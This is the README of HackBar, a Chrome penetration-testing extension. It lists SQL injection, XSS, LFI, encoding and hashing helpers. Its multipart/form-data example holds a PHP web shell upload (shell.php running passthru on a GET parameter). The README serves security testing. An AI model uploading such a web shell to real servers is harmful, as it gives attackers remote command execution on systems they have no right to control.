# HackBar

HackBar for Chrome.

Available on [Chrome Web Store](https://chrome.google.com/webstore/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc).

## Requested Permissions

* tabs
* webRequest
* webRequestBlocking

## Features

* Support GET and POST (including [multipart/form-data](#multipartform-data)) method.

* SQLi
  * Dump all database names (MySQL, PostgreSQL)
  * Dump tables from database (MySQL, PostgreSQL)
  * Dump columns from database (MySQL, PostgreSQL)
  * Union select statement (MySQL, PostgreSQL)
  * Error-based injection statement (MySQL)
  * Space to Inline comment

* XSS
  * Html encode/decode
  * String.fromCharCode encode/decode

* LFI
  * PHP wrapper - Base64

* Encoding
  * URL encode/decode
  * Base64 encode/decode
  * Hexadecimal encode/decode
  * Unicode encode/decode

* Hashing
  * MD5
  * SHA1
  * SHA256
  * SHA512

## Shortcuts

| Description | Default   | Mac           |
| ----------- | --------- | ------------- |
| Load URL    | `Alt + A` | `Control + A` |
| Split URL   | `Alt + S` | `Control + S` |
| Execute URL | `Alt + X` | `Control + X` |

## multipart/form-data

After changing **enctype** field to ```multipart/form-data```, you can put your request payload into **Body** field such as the following:

```
------WebKitFormBoundarydbJBATDXCC6CL0lZ
Content-Disposition: form-data; name="user"

user
------WebKitFormBoundarydbJBATDXCC6CL0lZ
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-httpd-php

<?php passthru($_GET['c']); ?>
------WebKitFormBoundarydbJBATDXCC6CL0lZ--
```

We will consider the first line as boundary, and reconstruct a form element to send your request.

Therefore, sent boundary will not be the same as your typed.

## Third-party Libraries

* Vue.js
* Vuetify.js
* [jshashes](https://github.com/h2non/jshashes)
* [utf8.js](https://github.com/mathiasbynens/utf8.js)
